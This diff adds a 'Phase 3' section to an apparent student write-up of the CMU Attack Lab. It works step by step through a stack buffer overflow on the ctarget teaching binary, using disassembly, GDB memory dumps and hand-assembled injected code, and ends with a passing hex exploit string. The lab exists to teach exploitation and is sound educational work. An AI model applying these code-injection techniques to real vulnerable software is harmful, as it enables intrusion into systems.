@@ -395,3 +395,260 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 48 8B 3C 25 E4 44 60 00 68 EC 17 40 00 C3 78 DC 61 55
 ```
+
+## Phase 3
+
+This phase requires executing `touch3` and passing a string representation of the cookie as its argument (via `rdi`)
+
+```asm
+000000000040184c <hexmatch>:
+  40184c:	41 54                	push   %r12
+  40184e:	55                   	push   %rbp
+  40184f:	53                   	push   %rbx
+  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp     # rsp += -128 (buffer for snprintf)
+  401854:	41 89 fc             	mov    %edi,%r12d
+  401857:	48 89 f5             	mov    %rsi,%rbp
+  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+  401861:	00 00
+  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
+  401868:	31 c0                	xor    %eax,%eax
+  40186a:	e8 41 f5 ff ff       	call   400db0 <random@plt>
+  40186f:	48 89 c1             	mov    %rax,%rcx
+  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
+  401879:	0a d7 a3
+  40187c:	48 f7 ea             	imul   %rdx
+  40187f:	48 01 ca             	add    %rcx,%rdx
+  401882:	48 c1 fa 06          	sar    $0x6,%rdx
+  401886:	48 89 c8             	mov    %rcx,%rax
+  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
+  40188d:	48 29 c2             	sub    %rax,%rdx
+  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
+  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
+  401898:	48 c1 e0 02          	shl    $0x2,%rax
+  40189c:	48 29 c1             	sub    %rax,%rcx
+  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
+  4018a3:	45 89 e0             	mov    %r12d,%r8d
+  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
+  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
+  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
+  4018b7:	48 89 df             	mov    %rbx,%rdi
+  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
+  4018bf:	e8 ac f5 ff ff       	call   400e70 <__sprintf_chk@plt>
+  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
+  4018c9:	48 89 de             	mov    %rbx,%rsi
+  4018cc:	48 89 ef             	mov    %rbp,%rdi
+  4018cf:	e8 cc f3 ff ff       	call   400ca0 <strncmp@plt>
+  4018d4:	85 c0                	test   %eax,%eax
+  4018d6:	0f 94 c0             	sete   %al
+  4018d9:	0f b6 c0             	movzbl %al,%eax
+  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
+  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
+  4018e8:	00 00
+  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
+  4018ec:	e8 ef f3 ff ff       	call   400ce0 <__stack_chk_fail@plt>
+  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
+  4018f5:	5b                   	pop    %rbx
+  4018f6:	5d                   	pop    %rbp
+  4018f7:	41 5c                	pop    %r12
+  4018f9:	c3                   	ret
+
+...
+
+00000000004018fa <touch3>:
+  4018fa:	53                   	push   %rbx
+  4018fb:	48 89 fb             	mov    %rdi,%rbx
+  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
+  401905:	00 00 00
+  401908:	48 89 fe             	mov    %rdi,%rsi
+  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
+  401911:	e8 36 ff ff ff       	call   40184c <hexmatch>
+  401916:	85 c0                	test   %eax,%eax
+  401918:	74 23                	je     40193d <touch3+0x43>
+  40191a:	48 89 da             	mov    %rbx,%rdx
+  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
+  401922:	bf 01 00 00 00       	mov    $0x1,%edi
+  401927:	b8 00 00 00 00       	mov    $0x0,%eax
+  40192c:	e8 bf f4 ff ff       	call   400df0 <__printf_chk@plt>
+  401931:	bf 03 00 00 00       	mov    $0x3,%edi
+  401936:	e8 52 03 00 00       	call   401c8d <validate>
+  40193b:	eb 21                	jmp    40195e <touch3+0x64>
+  40193d:	48 89 da             	mov    %rbx,%rdx
+  401940:	be 60 31 40 00       	mov    $0x403160,%esi
+  401945:	bf 01 00 00 00       	mov    $0x1,%edi
+  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
+  40194f:	e8 9c f4 ff ff       	call   400df0 <__printf_chk@plt>
+  401954:	bf 03 00 00 00       	mov    $0x3,%edi
+  401959:	e8 f1 03 00 00       	call   401d4f <fail>
+  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
+  401963:	e8 d8 f4 ff ff       	call   400e40 <exit@plt>
+```
+
+## To inspect via `GDB` adjust the phase 1 exploit to point to the address of `touch3`
+
+- `73 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 65 fa 18 40`
+
+- Stepping through `touch3` and `hexmatch`, it appears that only the first 8 bytes of the exploit string, [73 7a 7a 7a 7a 7a 7a 7a] are preserved after pushing the callee
+  saved registers onto the stack in `hexmatch`
+
+```shell
+(gdb) x/12gx $rsp-64
+0x5561dc40:     0x000000005561dc78      0x000000005561dca3
+0x5561dc50:     0x0000000000401a8a      0x0000000055586000
+0x5561dc60:     0x0000000055685fe8      0x0000000000000002
+0x5561dc70:     0x00000000004017b4      0x7a7a7a7a7a7a7a73 # <- here at 0x5561dc78
+0x5561dc80:     0x00007ffff7e038e0      0x0000000055685fe8
+0x5561dc90:     0x0000000000000002      0x0000000000401916
+```
+
+- Can see the expected string passed to `strncmp` is
+
+```shell
+(gdb) x/s $rsi
+0x5561dc13:     "59b997fa"
+```
+
+So need to construct an exploit string, that will
+
+- Place the bytes representing `"59b997fa"` at position `0x5561dc78` followed by null byte to terminate the string
+- Place exploit code between string and address of exploit code
+
+  - Exploit code needs setup `rdi` to point to cookie string
+  - Needs to push address of `touch3`, and then call `ret`
+
+- "59b997fa" -> [35 39 62 39 39 37 66 61]
+
+```asm
+movabs  $0x3539623939376661, %rax           # push string bytes to register
+movq    %rax, (0x5561dc78)                  # move string bytes to stack position
+movq    $0x5561dc78, %rdi                   # set rdi to &string
+push    $0x4018fa                           # push touch3 return address
+ret                                         # return
+```
+
+```asm
+0000000000000000 <.text>:
+   0:	48 b8 61 66 37 39 39 	movabs $0x3539623939376661,%rax
+   7:	62 39 35
+   a:	48 89 04 25 78 dc 61 	mov    %rax,0x5561dc78
+  11:	55
+  12:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi
+  19:	68 fa 18 40 00       	push   $0x4018fa
+  1e:	c3                   	ret
+
+```
+
+- [cookie string] [movabs] [mov] [mov] [push] [instructions address]
+- `[48 b8 61 66 37 39 39 62 39 35] [48 89 04 25 78 dc 61 55] [48 c7 c7 78 dc 61 55] [68 fa 18 40 00] [c3] [???]`
+- Need to inspect what instruction address should be
+- Have used placeholder address of `31 32 33 34 35 36 37 38 39`
+
+```shell
+(gdb) x/6gx $rsp
+0x5561dc78:     0x39623939376661b8      0x61dc782504894835
+0x5561dc88:     0x5561dc78c7c74855      0x3231c3004018fa68
+0x5561dc98:     0x0000383736353433      0x0000000000401976
+```
+
+- Looks like need 9 bytes of padding after instructions?
+- And address of instructions is `0x5561dc78`
+
+- `[48 b8 61 66 37 39 39] [62 39 35] [48 89 04 25 78 dc 61] [55] [48 c7 c7 78 dc 61 55] [68 fa 18 40 00] [c3] [00 00 00 00 00 00 00 00 00] [78 dc 61 55]`
+
+Even though the string is not yet null terminated, can see after the `mov %rax,0x5561dc78` instruction that the string is there but backwards
+
+```shell
+(gdb) x/8bc 0x5561dc78
+0x5561dc78:     97 'a'  102 'f' 55 '7'  57 '9'  57 '9'  98 'b'  57 '9'  53 '5'
+```
+
+- Need to reverse the bytes in the movabs instruction
+- Also need to include a '\0' NUL byte
+  - This would have to be place at the exact address `0x5561dc80`
+  - Need to step through and see what this value is and if its okay to overwrite
+  - Okay `hexmatch` overwrites the value at `0x5561dc78`, so do I need to place the value past the stack space it allocates?
+  - `rsp` is at `0x5561dc00` after it allocates its 128 bytes on the stack, so store below that?
+  - And also make the next byte zero'd out for the null byte?
+
+```asm
+movabs  $0x6166373939623935, %rax           # push string bytes to register
+movq    $0x5561dbf0, %rdi                   # set rdi to &string
+movq    %rax, (%rdi)                        # move string bytes to stack position
+movl    $0, 8(%rdi)                         # NUL terminate string (movl will clear upper 4 bytes)
+push    $0x4018fa                           # push touch3 return address
+ret                                         # return
+```
+
+```asm
+0000000000000000 <.text>:
+   0:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
+   7:	37 66 61
+   a:	48 c7 c7 f0 db 61 55 	mov    $0x5561dbf0,%rdi
+  11:	48 89 07             	mov    %rax,(%rdi)
+  14:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%rdi)
+  1b:	68 fa 18 40 00       	push   $0x4018fa
+  20:	c3                   	ret
+```
+
+- `[movabs] [mov] [mov] [movl] [push] [ret] [instruction address]`
+- `[48 b8 35 39 62 39 39 37 66 61] [48 c7 c7 f0 db 61 55] [48 89 07] [c7 47 08 00 00 00 00] [68 fa 18 40 00] [c3] [???]`
+- Need to determine new instruction address and any padding required
+
+```shell
+(gdb) x/6gx $rsp
+0x5561dc78:     0x373939623935b848      0x61dbf0c7c7486166
+0x5561dc88:     0x000847c707894855      0x004018fa68000000
+0x5561dc98:     0x37363534333231c3      0x0000000000400038
+```
+
+- Can see we need 7 bytes padding to push the mock return address [31 32 33 34 35 36 37 38] to fit into the return address memory
+- The address of the start of the exploit is the same
+- Going to fill with `nop` this time
+- `[48 b8 35 39 62 39 39 37 66 61] [48 c7 c7 f0 db 61 55] [48 89 07] [c7 47 08 00 00 00 00] [68 fa 18 40 00] [c3] [90 90 90 90 90 90 90] [78 dc 61 55]`
+
+- Okay can't do that
+- `hexmatch` calls `srandom` which then also allocates things on the stack which overwrites our string
+- `hexmatch` allocates `128` bytes on the stack, and the labsheet says the original `C` code only specifys `cbfuf[110]`
+- Could that remaining 18 bytes be used?
+- From the disassembly, can see theres a canary used at 0x78 (120)
+- So does that leave 10 bytes available to be used?
+- Would need to find the address of the 10 bytes...
+
+- Oh... can I just move the stack pointer to below my string so it doesn't get overwritten?
+
+- Or can I just place it above the stack pointer so that it never gets accessed again?
+- `0x5561dca8` is the address below `rsp` during `getbuf`, will get decremented to when `ret` sends to instructions
+- Try 1 more up `0x5561dcb0` which is below `rsp` at start of `touch3`?
+
+```asm
+movabs  $0x6166373939623935, %rax           # push string bytes to register
+movq    $0x5561dcb0, %rdi                   # set rdi to &string
+movq    %rax, (%rdi)                        # move string bytes to stack position
+movl    $0, 8(%rdi)                         # NUL terminate string (movl will clear upper 4 bytes)
+push    $0x4018fa                           # push touch3 return address
+ret                                         # return
+```
+
+```asm
+0000000000000000 <.text>:
+   0:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
+   7:	37 66 61
+   a:	48 c7 c7 b0 dc 61 55 	mov    $0x5561dcb0,%rdi
+  11:	48 89 07             	mov    %rax,(%rdi)
+  14:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%rdi)
+  1b:	68 fa 18 40 00       	push   $0x4018fa
+  20:	c3                   	ret
+```
+
+- `[48 b8 35 39 62 39 39 37 66 61] [48 c7 c7 b0 dc 61 55] [48 89 07] [c7 47 08 00 00 00 00] [68 fa 18 40 00] [c3] [90 90 90 90 90 90 90] [78 dc 61 55]`
+
+```shell
+🐳 ❯ ./ctarget -qi phase3.exploit.bin
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 B8 35 39 62 39 39 37 66 61 48 C7 C7 B0 DC 61 55 48 89 07 C7 47 08 00 00 00 00 68 FA 18 40 00 C3 90 90 90 90 90 90 90 78 DC 61 55
+```
